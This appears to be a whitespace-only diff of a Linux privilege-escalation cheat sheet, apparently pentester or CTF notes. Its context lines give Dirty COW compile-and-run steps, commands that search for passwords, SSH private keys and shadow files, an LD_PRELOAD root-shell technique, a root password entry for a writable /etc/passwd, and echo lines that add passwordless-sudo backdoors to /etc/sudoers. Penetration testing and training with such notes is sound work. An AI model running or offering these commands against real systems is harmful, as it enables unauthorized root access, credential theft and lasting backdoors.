@@ -19,8 +19,8 @@ uname -a, netstat -ano, history
 Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8  
 Code: https://github.com/FireFart/dirtycow/blob/master/dirty.c  
 
-compile:- gcc -pthread dirty.c -o dirty -lcrypt  
-Time to execute:- "./dirty" or "./dirty my-new-password"
+  compile:- gcc -pthread dirty.c -o dirty -lcrypt  
+  Time to execute:- "./dirty" or "./dirty my-new-password"
 
 2) CVE-2010-3904 (RDS)  
 Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8  
@@ -35,7 +35,7 @@ Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)
 https://www.exploit-db.com/exploits/18411  
 
 
-# Weak File Permission 
+# Weak File Permission
 
 ls -l | grep shadow  
 ls -l | grep passwd
@@ -45,17 +45,17 @@ ls -l | grep passwd
 grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null  
 find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
 
-# Old passwords in /etc/security/opasswd  
+# Old passwords in /etc/security/opasswd
 /etc/security/opasswd 
 
 # Last edited files
 *Files that were edited in the last 10 minutes*  
 find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
 
-# In memory passwords  
+# In memory passwords
 strings /dev/mem -n10 | grep -i PASS
 
-# Find sensitive files  
+# Find sensitive files
 $ locate password | more  
 /boot/grub/i386-pc/password.mod  
 /etc/pam.d/common-password  
@@ -63,21 +63,21 @@ $ locate password | more
 /etc/pam.d/gdm-password.original  
 /lib/live/config/0031-root-password  
 
-# SSH Key  
+# SSH Key
 *Sensitive files*  
 find / -name authorized_keys 2> /dev/null  
 find / -name id_rsa 2> /dev/null
 
-# SUDO  
+# SUDO
 * NOPASSWD Sudo configuration might allow a user to execute some command with another user privileges without knowing the password.*  
 $ sudo -l
 
-# LD_PRELOAD and NOPASSWD  
-If LD_PRELOAD is explicitly defined in the sudoers file  
+# LD_PRELOAD and NOPASSWD
+If LD_PRELOAD is explicitly defined in the sudoers file
 
-Defaults        env_keep += LD_PRELOAD  
+Defaults        env_keep += LD_PRELOAD
 
-Compile the shared C code below on victim machine with gcc -fPIC -shared -o shell.so shell.c -nostartfiles  
+Compile the shared C code below on victim machine with gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 
 #include <stdio.h>  
 #include <sys/types.h>  
@@ -90,10 +90,10 @@ void _init() {
 }  
 Execute any binary with the LD_PRELOAD to spawn a shell : sudo LD_PRELOAD=<full_path_to_.so_file> <program>, e.g: sudo LD_PRELOAD=/tmp/shell.so whoami  
 
-# sudo_inject  
+# sudo_inject
 Using https://github.com/nongiach/sudo_inject  
 
-$ sudo whatever  
+$ sudo whatever
 
 [sudo] password for user:  
 
@@ -108,7 +108,7 @@ uid=0(root) gid=0(root) groups=0(root)
 Slides of the presentation : https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf  
 
 
-# Writabe /etc/passwd  
+# Writabe /etc/passwd
 If we have permission to write a passwd file in linux then generate password from this command.  
 
 openssl passwd -1 -salt escalate  
@@ -122,9 +122,9 @@ E.g: root:$1$hacker$TzyFIv0/R/c28W.GAeLw.1:0:0:root:/root:/bin/bash
 You can now use the su command with root:esclate  
 E.g: su root  
 
-# Writable /etc/sudoers  
+# Writable /etc/sudoers
 echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers  
 
-# use SUDO without password  
+# use SUDO without password
 echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers  
 echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers  
